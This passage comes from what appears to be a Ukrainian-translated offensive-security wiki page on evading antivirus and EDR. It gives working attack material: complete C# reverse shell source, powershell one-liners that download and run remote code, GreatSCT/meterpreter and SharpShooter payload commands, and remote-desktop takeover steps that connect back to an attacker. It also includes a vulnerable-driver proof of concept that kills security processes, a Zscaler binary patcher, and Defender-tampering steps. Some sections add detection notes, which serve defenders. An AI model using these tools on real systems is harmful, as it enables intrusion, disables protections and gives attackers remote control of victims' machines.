Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування в Windows, який дозволяє додаткам та системним компонентам **реєструвати події**. Однак його також можуть використовувати продукти безпеки для моніторингу та виявлення шкідливої активності.

Подібно до того, як AMSI відключається (обходиться), також можливо змусити функцію **`EtwEventWrite`** у процесі користувацького простору негайно повертати управління без реєстрації будь-яких подій. Це робиться шляхом патчення функції в пам'яті, щоб вона миттєво повертала, фактично відключаючи логування ETW для цього процесу.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# бінарників у пам'ять відоме вже давно і досі є відмінним способом запуску ваших post-exploitation інструментів без виявлення AV.

Оскільки payload буде завантажено безпосередньо в пам'ять без запису на диск, нам доведеться турбуватися лише про патчинг AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) вже надають можливість виконувати C# assemblies безпосередньо в пам'яті, але існують різні способи зробити це:

- **Fork\&Run**

Це передбачає **створення нового "жертвенного" процесу**, інжекцію вашого post-exploitation шкідливого коду в цей новий процес, виконання коду та, по завершенні, завершення нового процесу. Це має як переваги, так і недоліки. Перевага методу fork and run в тому, що виконання відбувається **поза** процесом нашого Beacon імпланту. Це означає, що якщо щось піде не так або буде виявлено під час post-exploitation дій, існує **значно вища ймовірність** виживання нашого **імпланту.** Недолік у тому, що є **вища ймовірність** бути виявленим за допомогою **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це інжекція post-exploitation шкідливого коду **у власний процес**. Таким чином ви можете уникнути створення нового процесу і його сканування AV, але недолік у тому, що якщо виконання payload піде не так, існує **набагато вища ймовірність** **втратити ваш beacon**, оскільки процес може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо хочете дізнатися більше про завантаження C# Assembly, подивіться цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell**, погляньте на [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) та відео S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код, використовуючи інші мови, надавши скомпрометованій машині доступ до інтерпретаторного оточення, встановленого на SMB share, контрольованому атакуючим.

Дозволяючи доступ до Interpreter Binaries та оточення на SMB share, ви можете **виконувати довільний код цими мовами в пам'яті** скомпрометованої машини.

Репозиторій зазначає: Defender все ще сканує скрипти, але, використовуючи Go, Java, PHP тощо, ми отримуємо **більшу гнучкість для обходу статичних сигнатур**. Тестування з випадковими необфусцованими reverse shell скриптами цими мовами показало успішні результати.

## TokenStomping

Token stomping — це техніка, яка дозволяє атакуючому **маніпулювати access token або продуктом безпеки, таким як EDR чи AV**, знижуючи його привілеї так, щоб процес не завершився, але не мав повноважень перевіряти шкідливу активність.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати дескриптори токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), досить просто розгорнути Chrome Remote Desktop на машині жертви, а потім використати його для takeover та підтримки persistence:
1. Завантажте з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім клацніть MSI-файл для Windows, щоб завантажити MSI.
2. Запустіть інсталятор у тиші на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть далі. Майстер попросить авторизувати; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте наданий параметр з деякими коригуваннями: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Зверніть увагу на параметр pin, який дозволяє встановити PIN без використання GUI).

## Advanced Evasion

Evasion — це дуже складна тема, іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому практично неможливо залишатися повністю непоміченим у зрілих середовищах.

Кожне середовище, з яким ви стикаєтеся, матиме свої сильні та слабкі сторони.

Раджу переглянути цей доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш просунуті техніки Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Ви можете використати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який буде **видаляти частини бінарника**, поки **не з'ясує, яку частину Defender** вважає шкідливою, і надасть вам розбивку.\
Інший інструмент, що робить **те саме**, — [**avred**](https://github.com/dobin/avred) з відкритим веб-сервісом за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows постачалися з **Telnet server**, який ви могли встановити (як адміністратор), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб він **запускався** під час старту системи і **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити telnet port** (stealth) та вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажте звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні bin-версії, не інсталятор)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **машину жертви**

#### **Reverse connection**

**Атакер** має запустити на своєму **хості** бінарник `vncviewer.exe -listen 5900`, щоб бути готовим прийняти зворотне **VNC connection**. Потім, на **жертві**: Запустіть демон winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Щоб зберегти прихованість, не робіть наступного

- Не запускайте `winvnc`, якщо він вже працює, інакше з’явиться [popup](https://i.imgur.com/1SROTTl.png). Перевірте, чи працює за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій же директорії, інакше відкриється [вікно налаштувань](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` за довідкою, інакше з’явиться [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний захисник дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# — використання компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів для C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання python для створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – вимкнення AV/EDR з простору ядра

Storm-2603 використав невелику консольну утиліту, відому як **Antivirus Terminator**, щоб вимкнути засоби захисту кінцевих точок перед розгортанням ransomware. Інструмент приносить свій **власний уразливий, але *підписаний* драйвер** і зловживає ним для виконання привілейованих операцій у ядрі, які не можуть бути заблоковані навіть службами AV зі статусом Protected-Process-Light (PPL).

Ключові висновки
1. **Підписаний драйвер**: Файл, що записується на диск — `ServiceMouse.sys`, але бінарний файл — це легітимно підписаний драйвер `AToolsKrnl64.sys` з “System In-Depth Analysis Toolkit” від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли увімкнено Driver-Signature-Enforcement (DSE).
2. **Встановлення сервісу**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **сервіс ядра**, а другий запускає його, після чого `\\.\ServiceMouse` стає доступним з простору користувача.
3. **IOCTLи, що експонуються драйвером**
| IOCTL code | Дія                              |
|-----------:|----------------------------------|
| `0x99000050` | Завершити довільний процес за PID (використовується для зупинки служб Defender/EDR) |
| `0x990000D0` | Видалити довільний файл на диску |
| `0x990001D0` | Вивантажити драйвер та видалити сервіс |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**: BYOVD повністю оминає захист у user-mode; код, що виконується в ядрі, може відкривати *protected* процеси, завершувати їх або модифікувати об'єкти ядра незалежно від PPL/PP, ELAM або інших механізмів посилення безпеки.

Виявлення / Мітігація
•  Увімкніть список блокування вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлявся завантажувати `AToolsKrnl64.sys`.  
•  Моніторте створення нових *kernel* сервісів і сповіщайте, коли драйвер завантажується з каталогу з правами запису для всіх або не присутній у білому списку.  
•  Слідкуйте за дескрипторами із простору користувача до кастомних device-об'єктів, після яких виконуються підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector шляхом патчування бінарних файлів на диску

Zscaler’s **Client Connector** локально застосовує правила device-posture і покладається на Windows RPC для передачі результатів іншим компонентам. Два слабкі рішення в дизайні роблять можливим повний обхід:

1. Оцінка стану виконується **повністю на боці клієнта** (на сервер відправляється булеве значення).  
2. Внутрішні RPC-ендпоінти перевіряють лише те, що підключний виконуваний файл **підписаний Zscaler** (через `WinVerifyTrust`).

Шляхом **патчування чотирьох підписаних бінарних файлів на диску** обидва механізми можна нейтралізувати:

| Binary | Оригінальна логіка | Результат |
|--------|--------------------|----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка вважається відповідною |
| `ZSAService.exe` | Косвовий виклик до `WinVerifyTrust` | NOP-заміна ⇒ будь-який (навіть непідписаний) процес може підключитися до RPC-пайпів |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Пропущено |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску стеку сервісів:

* **Усі** перевірки стану показують **зелені/відповідні**.
* Непідписані або змінені бінарні файли можуть відкривати named-pipe RPC endpoints (наприклад `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей кейс демонструє, як чисто клієнтські рішення довіри та прості перевірки підписів можна обійти кількома байтовими патчами.

## Зловживання Protected Process Light (PPL) для підміни AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) реалізує ієрархію підписувач/рівень, так що лише захищені процеси з рівнем не нижчим можуть змінювати один одного. З позиції атаки, якщо ви можете легітимно запустити бінарник з підтримкою PPL і контролювати його аргументи, ви можете перетворити доброякісну функціональність (наприклад, логування) на обмежений, PPL-backed write primitive проти захищених директорій, які використовують AV/EDR.

Що змушує процес працювати як PPL
- Цільовий EXE (і будь-які завантажені DLLs) має бути підписаний з EKU, що підтримує PPL.
- Процес має бути створений через CreateProcess з прапорами: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Має бути запрошено сумісний рівень захисту, який відповідає підписувачу бінарника (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для anti-malware signers, `PROTECTION_LEVEL_WINDOWS` для Windows signers). Невірні рівні призведуть до відмови при створенні.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Схема використання:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Підписаний системний виконуваний файл `C:\Windows\System32\ClipUp.exe` самозапускається і приймає параметр для запису лог-файлу у шлях, вказаний викликачем.
- Якщо запущено як PPL-процес, запис файлу відбувається з підтримкою PPL.
- ClipUp не вміє розбирати шляхи, що містять пробіли; використовуйте 8.3 короткі шляхи, щоб вказувати у зазвичай захищені місця.

8.3 short path helpers
- Переглянути короткі імена: `dir /x` у кожному батьківському каталозі.
- Отримати короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть PPL-можливий LOLBIN (ClipUp) з `CREATE_PROTECTED_PROCESS`, використовуючи лаунчер (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху лог-файлу ClipUp, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте 8.3 короткі імена.
3) Якщо цільовий бінарник зазвичай відкритий/заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження до того, як AV запуститься, встановивши автозапускову службу, яка надійно стартує раніше. Перевірте порядок завантаження за допомогою Process Monitor (boot logging).
4) Після перезавантаження запис з підтримкою PPL виконується до того, як AV заблокує свої бінарники, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Ви не можете контролювати вміст, який записує ClipUp, крім розміщення; ця примітива придатна для корупції даних, а не для точної ін’єкції вмісту.
- Потрібні локальні права admin/SYSTEM для встановлення/запуску служби та вікно для перезавантаження.
- Таймінг критичний: ціль не повинна бути відкрита; виконання під час завантаження уникатиме блокувань файлів.

Detections
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо батьківський процес нетиповий, в момент завантаження.
- Нові служби, налаштовані на автостарт під підозрілі бінарні файли й які послідовно стартують до Defender/AV. Дослідіть створення/зміну служби до помилок запуску Defender.
- Моніторинг цілісності файлів у бінарниках/Platform каталогах Defender; непередбачувані створення/зміни файлів процесами з прапорами protected-process.
- ETW/EDR телеметрія: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS` та аномальне використання PPL рівнів неприв'язаними до AV бінарями.

Mitigations
- WDAC/Code Integrity: обмежити, які підписані бінарні файли можуть запускатися як PPL і під якими батьками; блокувати виклики ClipUp поза легітимними контекстами.
- Гігієна служб: обмежити створення/зміну служб з автостартом та моніторити маніпуляції порядком запуску.
- Переконайтеся, що tamper protection Defender та захист раннього запуску увімкнені; розслідуйте помилки старту, що вказують на корупцію бінарників.
- Розгляньте можливість відключення генерації 8.3 short-name на томах, де розміщені інструменти безпеки, якщо це сумісно з вашим середовищем (ретельно тестуйте).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender обирає платформу, з якої працювати, перебираючи підпапки в:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підпапку з найвищим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), після чого запускає процеси служби Defender звідти (оновлюючи шляхи служби/реєстру відповідно). Цей вибір довіряє записам директорій, включно з directory reparse points (symlinks). Адміністратор може скористатися цим, щоб перенаправити Defender у шлях, доступний для запису атакуючим, і досягти DLL sideloading або порушення роботи служби.

Preconditions
- Локальний Administrator (необхідно для створення директорій/symlink під Platform folder)
- Можливість перезавантаження або тригеру повторного вибору платформи Defender (перезапуск служби при завантаженні)
- Потрібні лише вбудовані інструменти (mklink)

Why it works
- Defender блокує запис у власні папки, але його вибір платформи довіряє записам директорій і обирає лексикографічно найвищу версію без перевірки, чи резолвиться ціль у захищений/довірений шлях.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть symlink на директорію з вищою версією всередині Platform, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Ви повинні побачити новий шлях процесу під `C:\TMP\AV\` та конфігурацію служби/реєстру, що відображає це розташування.

Post-exploitation options
- DLL sideloading/code execution: Помістіть або замініть DLL, які Defender завантажує з його каталогу застосунку, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть version-symlink, щоб при наступному запуску налаштований шлях не розв’язувався і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зверніть увагу: ця техніка сама по собі не забезпечує privilege escalation; вона вимагає admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перемістити runtime evasion з C2 implant у сам цільовий модуль, підключивши його Import Address Table (IAT) і маршрутизуючи вибрані APIs через attacker-controlled, position‑independent code (PIC). Це узагальнює evasion за межі вузької поверхні API, яку багато китів експонують (наприклад, CreateProcessA), і розширює ті ж захисти на BOFs та post‑exploitation DLLs.

High-level approach
- Stage a PIC blob поруч із цільовим модулем за допомогою reflective loader (prepended або companion). PIC має бути self‑contained і position‑independent.
- Коли host DLL завантажується, пройдіть його IMAGE_IMPORT_DESCRIPTOR і пропатчіть IAT entries для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує методи обходу перед tail‑calling реальної API адреси. Типові методи обходу включають:
  - Маскування/розмаскування пам'яті навколо виклику (наприклад, encrypt beacon regions, RWX→RX, змінити імена/дозволи сторінок), після чого відновити стан після виклику.
  - Call‑stack spoofing: побудувати benign стек і перейти в target API так, щоб call‑stack analysis відображала очікувані фрейми.
- Для сумісності експортуйте інтерфейс, щоб Aggressor script (або еквівалент) міг зареєструвати, які APIs хукати для Beacon, BOFs та post‑ex DLLs.

Why IAT hooking here
- Працює для будь‑якого коду, який використовує hooked import, без модифікації коду інструменту або покладання на Beacon для proxy певних APIs.
- Покриває post‑ex DLLs: hooking LoadLibrary* дозволяє перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати те ж маскування/stack evasion до їхніх викликів API.
- Відновлює надійне використання process‑spawning post‑ex команд проти виявлень, що базуються на call‑stack, шляхом обгортання CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Застосовуйте патч після relocations/ASLR і перед першим використанням імпорту. Reflective loaders як TitanLdr/AceLdr демонструють хукінг під час DllMain завантаженого модуля.
- Тримайте wrappers маленькими і PIC‑safe; отримуйте реальний API через оригінальне IAT значення, яке ви захопили до патчингу, або через LdrGetProcedureAddress.
- Використовуйте RW → RX переходи для PIC і уникайте залишення сторінок writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs будують фальшивий ланцюжок викликів (адреси повернення в benign modules) і потім переходять у реальний API.
- Це обходить механізми виявлення, які очікують канонічні стеки від Beacon/BOFs до чутливих APIs.
- Поєднуйте з техніками stack cutting/stack stitching, щоб опинитися всередині очікуваних фреймів перед прологом API.

Operational integration
- Приставляйте reflective loader до post‑ex DLLs, щоб PIC і hooks ініціалізувалися автоматично при завантаженні DLL.
- Використовуйте Aggressor script для реєстрації цільових APIs, щоб Beacon і BOFs прозоро користувалися тим самим шляхом evasion без зміни коду.

Detection/DFIR considerations
- IAT integrity: записи, які резолвляться в non‑image (heap/anon) адреси; періодична перевірка import pointers.
- Stack anomalies: адреси повернення, що не належать завантаженим image; різкі переходи до non‑image PIC; неконсистентне RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes до IAT, рання DllMain активність, що змінює import thunks, несподівані RX регіони, створені при load.
